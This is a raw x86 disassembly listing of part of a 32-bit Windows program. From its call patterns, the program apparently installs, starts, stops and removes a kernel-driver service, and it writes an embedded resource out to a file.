  401dc1:	75 13                	jne    0x401dd6
  401dc3:	ff 15 18 e1 41 00    	call   *0x41e118
  401dc9:	33 d2                	xor    %edx,%edx
  401dcb:	3d 31 04 00 00       	cmp    $0x431,%eax
  401dd0:	0f 94 c2             	sete   %dl
  401dd3:	8b c2                	mov    %edx,%eax
  401dd5:	c3                   	ret
  401dd6:	50                   	push   %eax
  401dd7:	ff 15 38 e0 41 00    	call   *0x41e038
  401ddd:	b8 01 00 00 00       	mov    $0x1,%eax
  401de2:	c3                   	ret
  401de3:	cc                   	int3
  401de4:	cc                   	int3
  401de5:	cc                   	int3
  401de6:	cc                   	int3
  401de7:	cc                   	int3
  401de8:	cc                   	int3
  401de9:	cc                   	int3
  401dea:	cc                   	int3
  401deb:	cc                   	int3
  401dec:	cc                   	int3
  401ded:	cc                   	int3
  401dee:	cc                   	int3
  401def:	cc                   	int3
  401df0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401df4:	6a 00                	push   $0x0
  401df6:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401dfa:	6a 00                	push   $0x0
  401dfc:	6a 00                	push   $0x0
  401dfe:	6a 00                	push   $0x0
  401e00:	6a 00                	push   $0x0
  401e02:	50                   	push   %eax
  401e03:	8b 44 24 20          	mov    0x20(%esp),%eax
  401e07:	6a 01                	push   $0x1
  401e09:	6a 03                	push   $0x3
  401e0b:	6a 01                	push   $0x1
  401e0d:	68 ff 01 0f 00       	push   $0xf01ff
  401e12:	50                   	push   %eax
  401e13:	50                   	push   %eax
  401e14:	51                   	push   %ecx
  401e15:	ff 15 34 e0 41 00    	call   *0x41e034
  401e1b:	85 c0                	test   %eax,%eax
  401e1d:	75 01                	jne    0x401e20
  401e1f:	c3                   	ret
  401e20:	50                   	push   %eax
  401e21:	ff 15 38 e0 41 00    	call   *0x41e038
  401e27:	b8 01 00 00 00       	mov    $0x1,%eax
  401e2c:	c3                   	ret
  401e2d:	cc                   	int3
  401e2e:	cc                   	int3
  401e2f:	cc                   	int3
  401e30:	83 ec 20             	sub    $0x20,%esp
  401e33:	55                   	push   %ebp
  401e34:	8b 2d b4 e0 41 00    	mov    0x41e0b4,%ebp
  401e3a:	ff d5                	call   *%ebp
  401e3c:	89 44 24 04          	mov    %eax,0x4(%esp)
  401e40:	a1 a8 60 42 00       	mov    0x4260a8,%eax
  401e45:	85 c0                	test   %eax,%eax
  401e47:	74 07                	je     0x401e50
  401e49:	50                   	push   %eax
  401e4a:	ff 15 38 e0 41 00    	call   *0x41e038
  401e50:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  401e54:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  401e58:	68 ff 01 0f 00       	push   $0xf01ff
  401e5d:	50                   	push   %eax
  401e5e:	51                   	push   %ecx
  401e5f:	ff 15 28 e0 41 00    	call   *0x41e028
  401e65:	a3 a8 60 42 00       	mov    %eax,0x4260a8
  401e6a:	85 c0                	test   %eax,%eax
  401e6c:	75 05                	jne    0x401e73
  401e6e:	5d                   	pop    %ebp
  401e6f:	83 c4 20             	add    $0x20,%esp
  401e72:	c3                   	ret
  401e73:	56                   	push   %esi
  401e74:	57                   	push   %edi
  401e75:	6a 00                	push   $0x0
  401e77:	6a 00                	push   $0x0
  401e79:	50                   	push   %eax
  401e7a:	ff 15 2c e0 41 00    	call   *0x41e02c
  401e80:	85 c0                	test   %eax,%eax
  401e82:	75 11                	jne    0x401e95
  401e84:	ff 15 18 e1 41 00    	call   *0x41e118
  401e8a:	3d 20 04 00 00       	cmp    $0x420,%eax
  401e8f:	74 04                	je     0x401e95
  401e91:	33 ff                	xor    %edi,%edi
  401e93:	eb 6c                	jmp    0x401f01
  401e95:	a1 a8 60 42 00       	mov    0x4260a8,%eax
  401e9a:	8b 35 30 e0 41 00    	mov    0x41e030,%esi
  401ea0:	53                   	push   %ebx
  401ea1:	8d 54 24 14          	lea    0x14(%esp),%edx
  401ea5:	52                   	push   %edx
  401ea6:	50                   	push   %eax
  401ea7:	bf 01 00 00 00       	mov    $0x1,%edi
  401eac:	ff d6                	call   *%esi
  401eae:	85 c0                	test   %eax,%eax
  401eb0:	74 4c                	je     0x401efe
  401eb2:	8b 1d f8 e0 41 00    	mov    0x41e0f8,%ebx
  401eb8:	eb 06                	jmp    0x401ec0
  401eba:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401ec0:	8b 44 24 18          	mov    0x18(%esp),%eax
  401ec4:	83 f8 04             	cmp    $0x4,%eax
  401ec7:	74 37                	je     0x401f00
  401ec9:	83 f8 01             	cmp    $0x1,%eax
  401ecc:	74 30                	je     0x401efe
  401ece:	ff d5                	call   *%ebp
  401ed0:	2b 44 24 10          	sub    0x10(%esp),%eax
  401ed4:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  401ed9:	77 18                	ja     0x401ef3
  401edb:	6a 64                	push   $0x64
  401edd:	ff d3                	call   *%ebx
  401edf:	8b 15 a8 60 42 00    	mov    0x4260a8,%edx
  401ee5:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401ee9:	51                   	push   %ecx
  401eea:	52                   	push   %edx
  401eeb:	ff d6                	call   *%esi
  401eed:	85 c0                	test   %eax,%eax
  401eef:	75 cf                	jne    0x401ec0
  401ef1:	eb 0b                	jmp    0x401efe
  401ef3:	68 1d 04 00 00       	push   $0x41d
  401ef8:	ff 15 fc e0 41 00    	call   *0x41e0fc
  401efe:	33 ff                	xor    %edi,%edi
  401f00:	5b                   	pop    %ebx
  401f01:	ff 15 18 e1 41 00    	call   *0x41e118
  401f07:	8b f0                	mov    %eax,%esi
  401f09:	a1 a8 60 42 00       	mov    0x4260a8,%eax
  401f0e:	50                   	push   %eax
  401f0f:	ff 15 38 e0 41 00    	call   *0x41e038
  401f15:	56                   	push   %esi
  401f16:	c7 05 a8 60 42 00 00 	movl   $0x0,0x4260a8
  401f1d:	00 00 00 
  401f20:	ff 15 fc e0 41 00    	call   *0x41e0fc
  401f26:	8b c7                	mov    %edi,%eax
  401f28:	5f                   	pop    %edi
  401f29:	5e                   	pop    %esi
  401f2a:	5d                   	pop    %ebp
  401f2b:	83 c4 20             	add    $0x20,%esp
  401f2e:	c3                   	ret
  401f2f:	cc                   	int3
  401f30:	83 ec 44             	sub    $0x44,%esp
  401f33:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  401f38:	33 c4                	xor    %esp,%eax
  401f3a:	89 44 24 40          	mov    %eax,0x40(%esp)
  401f3e:	8b 44 24 48          	mov    0x48(%esp),%eax
  401f42:	56                   	push   %esi
  401f43:	8b 74 24 50          	mov    0x50(%esp),%esi
  401f47:	50                   	push   %eax
  401f48:	8d 44 24 08          	lea    0x8(%esp),%eax
  401f4c:	68 30 08 42 00       	push   $0x420830
  401f51:	50                   	push   %eax
  401f52:	e8 fe 2a 00 00       	call   0x404a55
  401f57:	83 c4 0c             	add    $0xc,%esp
  401f5a:	6a 00                	push   $0x0
  401f5c:	68 80 00 00 00       	push   $0x80
  401f61:	6a 03                	push   $0x3
  401f63:	6a 00                	push   $0x0
  401f65:	6a 00                	push   $0x0
  401f67:	68 00 00 00 c0       	push   $0xc0000000
  401f6c:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  401f70:	51                   	push   %ecx
  401f71:	ff 15 74 e0 41 00    	call   *0x41e074
  401f77:	83 f8 ff             	cmp    $0xffffffff,%eax
  401f7a:	75 12                	jne    0x401f8e
  401f7c:	33 c0                	xor    %eax,%eax
  401f7e:	5e                   	pop    %esi
  401f7f:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  401f83:	33 cc                	xor    %esp,%ecx
  401f85:	e8 8c 24 00 00       	call   0x404416
  401f8a:	83 c4 44             	add    $0x44,%esp
  401f8d:	c3                   	ret
  401f8e:	85 f6                	test   %esi,%esi
  401f90:	74 17                	je     0x401fa9
  401f92:	89 06                	mov    %eax,(%esi)
  401f94:	b8 01 00 00 00       	mov    $0x1,%eax
  401f99:	5e                   	pop    %esi
  401f9a:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  401f9e:	33 cc                	xor    %esp,%ecx
  401fa0:	e8 71 24 00 00       	call   0x404416
  401fa5:	83 c4 44             	add    $0x44,%esp
  401fa8:	c3                   	ret
  401fa9:	50                   	push   %eax
  401faa:	ff 15 20 e1 41 00    	call   *0x41e120
  401fb0:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  401fb4:	5e                   	pop    %esi
  401fb5:	33 cc                	xor    %esp,%ecx
  401fb7:	b8 01 00 00 00       	mov    $0x1,%eax
  401fbc:	e8 55 24 00 00       	call   0x404416
  401fc1:	83 c4 44             	add    $0x44,%esp
  401fc4:	c3                   	ret
  401fc5:	cc                   	int3
  401fc6:	cc                   	int3
  401fc7:	cc                   	int3
  401fc8:	cc                   	int3
  401fc9:	cc                   	int3
  401fca:	cc                   	int3
  401fcb:	cc                   	int3
  401fcc:	cc                   	int3
  401fcd:	cc                   	int3
  401fce:	cc                   	int3
  401fcf:	cc                   	int3
  401fd0:	56                   	push   %esi
  401fd1:	57                   	push   %edi
  401fd2:	68 3f 00 0f 00       	push   $0xf003f
  401fd7:	6a 00                	push   $0x0
  401fd9:	6a 00                	push   $0x0
  401fdb:	ff 15 24 e0 41 00    	call   *0x41e024
  401fe1:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  401fe5:	8b f0                	mov    %eax,%esi
  401fe7:	8b 44 24 10          	mov    0x10(%esp),%eax
  401feb:	50                   	push   %eax
  401fec:	57                   	push   %edi
  401fed:	56                   	push   %esi
  401fee:	e8 fd fd ff ff       	call   0x401df0
  401ff3:	57                   	push   %edi
  401ff4:	56                   	push   %esi
  401ff5:	e8 36 fe ff ff       	call   0x401e30
  401ffa:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  401ffe:	51                   	push   %ecx
  401fff:	57                   	push   %edi
  402000:	e8 2b ff ff ff       	call   0x401f30
  402005:	83 c4 1c             	add    $0x1c,%esp
  402008:	56                   	push   %esi
  402009:	8b f8                	mov    %eax,%edi
  40200b:	ff 15 38 e0 41 00    	call   *0x41e038
  402011:	8b c7                	mov    %edi,%eax
  402013:	5f                   	pop    %edi
  402014:	5e                   	pop    %esi
  402015:	c3                   	ret
  402016:	cc                   	int3
  402017:	cc                   	int3
  402018:	cc                   	int3
  402019:	cc                   	int3
  40201a:	cc                   	int3
  40201b:	cc                   	int3
  40201c:	cc                   	int3
  40201d:	cc                   	int3
  40201e:	cc                   	int3
  40201f:	cc                   	int3
  402020:	83 ec 1c             	sub    $0x1c,%esp
  402023:	53                   	push   %ebx
  402024:	8b 1d b4 e0 41 00    	mov    0x41e0b4,%ebx
  40202a:	55                   	push   %ebp
  40202b:	56                   	push   %esi
  40202c:	ff d3                	call   *%ebx
  40202e:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402032:	8b e8                	mov    %eax,%ebp
  402034:	8b 44 24 30          	mov    0x30(%esp),%eax
  402038:	68 ff 01 0f 00       	push   $0xf01ff
  40203d:	50                   	push   %eax
  40203e:	51                   	push   %ecx
  40203f:	ff 15 28 e0 41 00    	call   *0x41e028
  402045:	8b f0                	mov    %eax,%esi
  402047:	85 f6                	test   %esi,%esi
  402049:	75 07                	jne    0x402052
  40204b:	5e                   	pop    %esi
  40204c:	5d                   	pop    %ebp
  40204d:	5b                   	pop    %ebx
  40204e:	83 c4 1c             	add    $0x1c,%esp
  402051:	c3                   	ret
  402052:	57                   	push   %edi
  402053:	8d 54 24 10          	lea    0x10(%esp),%edx
  402057:	52                   	push   %edx
  402058:	6a 01                	push   $0x1
  40205a:	56                   	push   %esi
  40205b:	ff 15 20 e0 41 00    	call   *0x41e020
  402061:	8b f8                	mov    %eax,%edi
  402063:	85 ff                	test   %edi,%edi
  402065:	74 52                	je     0x4020b9
  402067:	8d 44 24 10          	lea    0x10(%esp),%eax
  40206b:	50                   	push   %eax
  40206c:	56                   	push   %esi
  40206d:	ff 15 30 e0 41 00    	call   *0x41e030
  402073:	85 c0                	test   %eax,%eax
  402075:	74 40                	je     0x4020b7
  402077:	83 7c 24 14 01       	cmpl   $0x1,0x14(%esp)
  40207c:	74 3b                	je     0x4020b9
  40207e:	ff d3                	call   *%ebx
  402080:	2b c5                	sub    %ebp,%eax
  402082:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  402087:	77 23                	ja     0x4020ac
  402089:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40208d:	51                   	push   %ecx
  40208e:	56                   	push   %esi
  40208f:	ff 15 30 e0 41 00    	call   *0x41e030
  402095:	85 c0                	test   %eax,%eax
  402097:	75 de                	jne    0x402077
  402099:	56                   	push   %esi
  40209a:	33 ff                	xor    %edi,%edi
  40209c:	ff 15 38 e0 41 00    	call   *0x41e038
  4020a2:	8b c7                	mov    %edi,%eax
  4020a4:	5f                   	pop    %edi
  4020a5:	5e                   	pop    %esi
  4020a6:	5d                   	pop    %ebp
  4020a7:	5b                   	pop    %ebx
  4020a8:	83 c4 1c             	add    $0x1c,%esp
  4020ab:	c3                   	ret
  4020ac:	68 1d 04 00 00       	push   $0x41d
  4020b1:	ff 15 fc e0 41 00    	call   *0x41e0fc
  4020b7:	33 ff                	xor    %edi,%edi
  4020b9:	56                   	push   %esi
  4020ba:	ff 15 38 e0 41 00    	call   *0x41e038
  4020c0:	8b c7                	mov    %edi,%eax
  4020c2:	5f                   	pop    %edi
  4020c3:	5e                   	pop    %esi
  4020c4:	5d                   	pop    %ebp
  4020c5:	5b                   	pop    %ebx
  4020c6:	83 c4 1c             	add    $0x1c,%esp
  4020c9:	c3                   	ret
  4020ca:	cc                   	int3
  4020cb:	cc                   	int3
  4020cc:	cc                   	int3
  4020cd:	cc                   	int3
  4020ce:	cc                   	int3
  4020cf:	cc                   	int3
  4020d0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4020d4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4020d8:	56                   	push   %esi
  4020d9:	68 ff 01 0f 00       	push   $0xf01ff
  4020de:	50                   	push   %eax
  4020df:	51                   	push   %ecx
  4020e0:	ff 15 28 e0 41 00    	call   *0x41e028
  4020e6:	8b f0                	mov    %eax,%esi
  4020e8:	85 f6                	test   %esi,%esi
  4020ea:	75 02                	jne    0x4020ee
  4020ec:	5e                   	pop    %esi
  4020ed:	c3                   	ret
  4020ee:	57                   	push   %edi
  4020ef:	56                   	push   %esi
  4020f0:	ff 15 00 e0 41 00    	call   *0x41e000
  4020f6:	56                   	push   %esi
  4020f7:	8b f8                	mov    %eax,%edi
  4020f9:	ff 15 38 e0 41 00    	call   *0x41e038
  4020ff:	8b c7                	mov    %edi,%eax
  402101:	5f                   	pop    %edi
  402102:	5e                   	pop    %esi
  402103:	c3                   	ret
  402104:	cc                   	int3
  402105:	cc                   	int3
  402106:	cc                   	int3
  402107:	cc                   	int3
  402108:	cc                   	int3
  402109:	cc                   	int3
  40210a:	cc                   	int3
  40210b:	cc                   	int3
  40210c:	cc                   	int3
  40210d:	cc                   	int3
  40210e:	cc                   	int3
  40210f:	cc                   	int3
  402110:	56                   	push   %esi
  402111:	57                   	push   %edi
  402112:	68 3f 00 0f 00       	push   $0xf003f
  402117:	6a 00                	push   $0x0
  402119:	6a 00                	push   $0x0
  40211b:	ff 15 24 e0 41 00    	call   *0x41e024
  402121:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402125:	8b f0                	mov    %eax,%esi
  402127:	57                   	push   %edi
  402128:	56                   	push   %esi
  402129:	e8 f2 fe ff ff       	call   0x402020
  40212e:	57                   	push   %edi
  40212f:	56                   	push   %esi
  402130:	e8 9b ff ff ff       	call   0x4020d0
  402135:	83 c4 10             	add    $0x10,%esp
  402138:	56                   	push   %esi
  402139:	ff 15 38 e0 41 00    	call   *0x41e038
  40213f:	5f                   	pop    %edi
  402140:	b8 01 00 00 00       	mov    $0x1,%eax
  402145:	5e                   	pop    %esi
  402146:	c3                   	ret
  402147:	cc                   	int3
  402148:	cc                   	int3
  402149:	cc                   	int3
  40214a:	cc                   	int3
  40214b:	cc                   	int3
  40214c:	cc                   	int3
  40214d:	cc                   	int3
  40214e:	cc                   	int3
  40214f:	cc                   	int3
  402150:	8b 44 24 04          	mov    0x4(%esp),%eax
  402154:	57                   	push   %edi
  402155:	68 3f 00 0f 00       	push   $0xf003f
  40215a:	6a 00                	push   $0x0
  40215c:	50                   	push   %eax
  40215d:	ff 15 24 e0 41 00    	call   *0x41e024
  402163:	8b f8                	mov    %eax,%edi
  402165:	85 ff                	test   %edi,%edi
  402167:	75 02                	jne    0x40216b
  402169:	5f                   	pop    %edi
  40216a:	c3                   	ret
  40216b:	53                   	push   %ebx
  40216c:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402170:	55                   	push   %ebp
  402171:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  402175:	56                   	push   %esi
  402176:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40217a:	8b 54 24 18          	mov    0x18(%esp),%edx
  40217e:	51                   	push   %ecx
  40217f:	55                   	push   %ebp
  402180:	53                   	push   %ebx
  402181:	52                   	push   %edx
  402182:	57                   	push   %edi
  402183:	e8 f8 fb ff ff       	call   0x401d80
  402188:	83 c4 14             	add    $0x14,%esp
  40218b:	85 c0                	test   %eax,%eax
  40218d:	75 15                	jne    0x4021a4
  40218f:	ff 15 18 e1 41 00    	call   *0x41e118
  402195:	8b f0                	mov    %eax,%esi
  402197:	83 fe 34             	cmp    $0x34,%esi
  40219a:	74 08                	je     0x4021a4
  40219c:	81 fe 31 04 00 00    	cmp    $0x431,%esi
  4021a2:	75 25                	jne    0x4021c9
  4021a4:	53                   	push   %ebx
  4021a5:	57                   	push   %edi
  4021a6:	e8 85 fc ff ff       	call   0x401e30
  4021ab:	83 c4 08             	add    $0x8,%esp
  4021ae:	84 c0                	test   %al,%al
  4021b0:	75 20                	jne    0x4021d2
  4021b2:	ff 15 18 e1 41 00    	call   *0x41e118
  4021b8:	8b f0                	mov    %eax,%esi
  4021ba:	83 fe 20             	cmp    $0x20,%esi
  4021bd:	74 b7                	je     0x402176
  4021bf:	81 fe e5 03 00 00    	cmp    $0x3e5,%esi
  4021c5:	74 af                	je     0x402176
  4021c7:	eb 0b                	jmp    0x4021d4
  4021c9:	56                   	push   %esi
  4021ca:	ff 15 fc e0 41 00    	call   *0x41e0fc
  4021d0:	eb 02                	jmp    0x4021d4
  4021d2:	33 f6                	xor    %esi,%esi
  4021d4:	57                   	push   %edi
  4021d5:	ff 15 38 e0 41 00    	call   *0x41e038
  4021db:	56                   	push   %esi
  4021dc:	ff 15 fc e0 41 00    	call   *0x41e0fc
  4021e2:	33 c0                	xor    %eax,%eax
  4021e4:	85 f6                	test   %esi,%esi
  4021e6:	5e                   	pop    %esi
  4021e7:	5d                   	pop    %ebp
  4021e8:	5b                   	pop    %ebx
  4021e9:	0f 94 c0             	sete   %al
  4021ec:	5f                   	pop    %edi
  4021ed:	c3                   	ret
  4021ee:	cc                   	int3
  4021ef:	cc                   	int3
  4021f0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4021f4:	56                   	push   %esi
  4021f5:	57                   	push   %edi
  4021f6:	68 3f 00 0f 00       	push   $0xf003f
  4021fb:	6a 00                	push   $0x0
  4021fd:	50                   	push   %eax
  4021fe:	ff 15 24 e0 41 00    	call   *0x41e024
  402204:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402208:	8b f0                	mov    %eax,%esi
  40220a:	57                   	push   %edi
  40220b:	56                   	push   %esi
  40220c:	e8 0f fe ff ff       	call   0x402020
  402211:	57                   	push   %edi
  402212:	56                   	push   %esi
  402213:	e8 b8 fe ff ff       	call   0x4020d0
  402218:	83 c4 10             	add    $0x10,%esp
  40221b:	56                   	push   %esi
  40221c:	ff 15 38 e0 41 00    	call   *0x41e038
  402222:	5f                   	pop    %edi
  402223:	b8 01 00 00 00       	mov    $0x1,%eax
  402228:	5e                   	pop    %esi
  402229:	c3                   	ret
  40222a:	cc                   	int3
  40222b:	cc                   	int3
  40222c:	cc                   	int3
  40222d:	cc                   	int3
  40222e:	cc                   	int3
  40222f:	cc                   	int3
  402230:	51                   	push   %ecx
  402231:	53                   	push   %ebx
  402232:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  402236:	56                   	push   %esi
  402237:	8d 83 cc f7 ff ff    	lea    -0x834(%ebx),%eax
  40223d:	33 f6                	xor    %esi,%esi
  40223f:	57                   	push   %edi
  402240:	bf 00 13 00 00       	mov    $0x1300,%edi
  402245:	3d 83 03 00 00       	cmp    $0x383,%eax
  40224a:	77 19                	ja     0x402265
  40224c:	6a 02                	push   $0x2
  40224e:	56                   	push   %esi
  40224f:	68 38 08 42 00       	push   $0x420838
  402254:	ff 15 88 e0 41 00    	call   *0x41e088
  40225a:	8b f0                	mov    %eax,%esi
  40225c:	85 f6                	test   %esi,%esi
  40225e:	74 05                	je     0x402265
  402260:	bf 00 1b 00 00       	mov    $0x1b00,%edi
  402265:	6a 00                	push   $0x0
  402267:	6a 00                	push   $0x0
  402269:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40226d:	51                   	push   %ecx
  40226e:	68 00 04 00 00       	push   $0x400
  402273:	53                   	push   %ebx
  402274:	56                   	push   %esi
  402275:	57                   	push   %edi
  402276:	ff 15 84 e0 41 00    	call   *0x41e084
  40227c:	85 c0                	test   %eax,%eax
  40227e:	74 27                	je     0x4022a7
  402280:	6a 00                	push   $0x0
  402282:	8d 54 24 10          	lea    0x10(%esp),%edx
  402286:	52                   	push   %edx
  402287:	50                   	push   %eax
  402288:	8b 44 24 20          	mov    0x20(%esp),%eax
  40228c:	50                   	push   %eax
  40228d:	6a f4                	push   $0xfffffff4
  40228f:	ff 15 80 e0 41 00    	call   *0x41e080
  402295:	50                   	push   %eax
  402296:	ff 15 7c e0 41 00    	call   *0x41e07c
  40229c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4022a0:	51                   	push   %ecx
  4022a1:	ff 15 10 e1 41 00    	call   *0x41e110
  4022a7:	85 f6                	test   %esi,%esi
  4022a9:	74 07                	je     0x4022b2
  4022ab:	56                   	push   %esi
  4022ac:	ff 15 78 e0 41 00    	call   *0x41e078
  4022b2:	5f                   	pop    %edi
  4022b3:	5e                   	pop    %esi
  4022b4:	5b                   	pop    %ebx
  4022b5:	59                   	pop    %ecx
  4022b6:	c3                   	ret
  4022b7:	cc                   	int3
  4022b8:	cc                   	int3
  4022b9:	cc                   	int3
  4022ba:	cc                   	int3
  4022bb:	cc                   	int3
  4022bc:	cc                   	int3
  4022bd:	cc                   	int3
  4022be:	cc                   	int3
  4022bf:	cc                   	int3
  4022c0:	66 83 3d ac 60 42 00 	cmpw   $0x0,0x4260ac
  4022c7:	00 
  4022c8:	75 14                	jne    0x4022de
  4022ca:	6a f5                	push   $0xfffffff5
  4022cc:	ff 15 80 e0 41 00    	call   *0x41e080
  4022d2:	68 ac 60 42 00       	push   $0x4260ac
  4022d7:	50                   	push   %eax
  4022d8:	ff 15 8c e0 41 00    	call   *0x41e08c
  4022de:	56                   	push   %esi
  4022df:	68 48 08 42 00       	push   $0x420848
  4022e4:	e8 4c 2f 00 00       	call   0x405235
  4022e9:	83 c0 40             	add    $0x40,%eax
  4022ec:	50                   	push   %eax
  4022ed:	e8 9d 2d 00 00       	call   0x40508f
  4022f2:	0f bf 05 ac 60 42 00 	movswl 0x4260ac,%eax
  4022f9:	48                   	dec    %eax
  4022fa:	83 c4 08             	add    $0x8,%esp
  4022fd:	33 f6                	xor    %esi,%esi
  4022ff:	85 c0                	test   %eax,%eax
  402301:	7e 23                	jle    0x402326
  402303:	68 44 08 42 00       	push   $0x420844
  402308:	e8 28 2f 00 00       	call   0x405235
  40230d:	83 c0 40             	add    $0x40,%eax
  402310:	50                   	push   %eax
  402311:	e8 79 2d 00 00       	call   0x40508f
  402316:	0f bf 0d ac 60 42 00 	movswl 0x4260ac,%ecx
  40231d:	46                   	inc    %esi
  40231e:	49                   	dec    %ecx
  40231f:	83 c4 08             	add    $0x8,%esp
  402322:	3b f1                	cmp    %ecx,%esi
  402324:	7c dd                	jl     0x402303
  402326:	68 48 08 42 00       	push   $0x420848
  40232b:	e8 05 2f 00 00       	call   0x405235
  402330:	83 c0 40             	add    $0x40,%eax
  402333:	50                   	push   %eax
  402334:	e8 56 2d 00 00       	call   0x40508f
  402339:	83 c4 08             	add    $0x8,%esp
  40233c:	5e                   	pop    %esi
  40233d:	c3                   	ret
  40233e:	cc                   	int3
  40233f:	cc                   	int3
  402340:	8b 44 24 04          	mov    0x4(%esp),%eax
  402344:	56                   	push   %esi
  402345:	68 50 08 42 00       	push   $0x420850
  40234a:	50                   	push   %eax
  40234b:	6a 00                	push   $0x0
  40234d:	ff 15 9c e0 41 00    	call   *0x41e09c
  402353:	8b f0                	mov    %eax,%esi
  402355:	85 f6                	test   %esi,%esi
  402357:	75 04                	jne    0x40235d
  402359:	32 c0                	xor    %al,%al
  40235b:	5e                   	pop    %esi
  40235c:	c3                   	ret
  40235d:	53                   	push   %ebx
  40235e:	57                   	push   %edi
  40235f:	56                   	push   %esi
  402360:	6a 00                	push   $0x0
  402362:	ff 15 98 e0 41 00    	call   *0x41e098
  402368:	56                   	push   %esi
  402369:	6a 00                	push   $0x0
  40236b:	8b f8                	mov    %eax,%edi
  40236d:	ff 15 94 e0 41 00    	call   *0x41e094
  402373:	57                   	push   %edi
  402374:	8b d8                	mov    %eax,%ebx
  402376:	ff 15 90 e0 41 00    	call   *0x41e090
  40237c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402380:	68 4c 08 42 00       	push   $0x42084c
  402385:	51                   	push   %ecx
  402386:	8b f8                	mov    %eax,%edi
  402388:	e8 f8 33 00 00       	call   0x405785
  40238d:	8b f0                	mov    %eax,%esi
  40238f:	83 c4 08             	add    $0x8,%esp
  402392:	85 f6                	test   %esi,%esi
  402394:	75 06                	jne    0x40239c
  402396:	5f                   	pop    %edi
  402397:	5b                   	pop    %ebx
  402398:	32 c0                	xor    %al,%al
  40239a:	5e                   	pop    %esi
  40239b:	c3                   	ret
  40239c:	56                   	push   %esi
  40239d:	53                   	push   %ebx
  40239e:	6a 01                	push   $0x1
  4023a0:	57                   	push   %edi
  4023a1:	e8 99 32 00 00       	call   0x40563f
  4023a6:	56                   	push   %esi
  4023a7:	e8 b5 30 00 00       	call   0x405461
  4023ac:	83 c4 14             	add    $0x14,%esp
  4023af:	5f                   	pop    %edi
  4023b0:	5b                   	pop    %ebx
  4023b1:	b0 01                	mov    $0x1,%al
  4023b3:	5e                   	pop    %esi
  4023b4:	c3                   	ret
  4023b5:	cc                   	int3
  4023b6:	cc                   	int3
  4023b7:	cc                   	int3
  4023b8:	cc                   	int3
  4023b9:	cc                   	int3
  4023ba:	cc                   	int3
  4023bb:	cc                   	int3
  4023bc:	cc                   	int3
  4023bd:	cc                   	int3
  4023be:	cc                   	int3
  4023bf:	cc                   	int3
  4023c0:	81 ec 08 01 00 00    	sub    $0x108,%esp
  4023c6:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  4023cb:	33 c4                	xor    %esp,%eax
  4023cd:	89 84 24 04 01 00 00 	mov    %eax,0x104(%esp)
  4023d4:	80 3d a4 60 42 00 00 	cmpb   $0x0,0x4260a4
  4023db:	8b 84 24 0c 01 00 00 	mov    0x10c(%esp),%eax
  4023e2:	74 21                	je     0x402405
  4023e4:	50                   	push   %eax
  4023e5:	8d 44 24 04          	lea    0x4(%esp),%eax
  4023e9:	68 58 08 42 00       	push   $0x420858
  4023ee:	50                   	push   %eax
  4023ef:	e8 61 26 00 00       	call   0x404a55
  4023f4:	83 c4 0c             	add    $0xc,%esp
  4023f7:	6a 01                	push   $0x1
  4023f9:	6a 00                	push   $0x0
  4023fb:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4023ff:	51                   	push   %ecx
  402400:	e8 d3 19 00 00       	call   0x403dd8
  402405:	8b 8c 24 04 01 00 00 	mov    0x104(%esp),%ecx
  40240c:	33 cc                	xor    %esp,%ecx
  40240e:	e8 03 20 00 00       	call   0x404416
  402413:	81 c4 08 01 00 00    	add    $0x108,%esp
  402419:	c3                   	ret
  40241a:	cc                   	int3
  40241b:	cc                   	int3
  40241c:	cc                   	int3
  40241d:	cc                   	int3
  40241e:	cc                   	int3
  40241f:	cc                   	int3
  402420:	81 ec 2c 01 00 00    	sub    $0x12c,%esp
  402426:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  40242b:	33 c4                	xor    %esp,%eax
  40242d:	89 84 24 28 01 00 00 	mov    %eax,0x128(%esp)
  402434:	8b 84 24 30 01 00 00 	mov    0x130(%esp),%eax
  40243b:	56                   	push   %esi
  40243c:	8b b4 24 38 01 00 00 	mov    0x138(%esp),%esi
  402443:	80 3e 00             	cmpb   $0x0,(%esi)
  402446:	57                   	push   %edi
  402447:	8b bc 24 40 01 00 00 	mov    0x140(%esp),%edi
  40244e:	c6 44 24 0b 00       	movb   $0x0,0xb(%esp)
  402453:	75 19                	jne    0x40246e
  402455:	5f                   	pop    %edi
  402456:	32 c0                	xor    %al,%al
  402458:	5e                   	pop    %esi
  402459:	8b 8c 24 28 01 00 00 	mov    0x128(%esp),%ecx
  402460:	33 cc                	xor    %esp,%ecx
  402462:	e8 af 1f 00 00       	call   0x404416
  402467:	81 c4 2c 01 00 00    	add    $0x12c,%esp
  40246d:	c3                   	ret
  40246e:	50                   	push   %eax
  40246f:	8d 44 24 30          	lea    0x30(%esp),%eax
  402473:	68 58 08 42 00       	push   $0x420858
  402478:	50                   	push   %eax
  402479:	e8 d7 25 00 00       	call   0x404a55
  40247e:	33 c0                	xor    %eax,%eax
  402480:	83 c4 0c             	add    $0xc,%esp
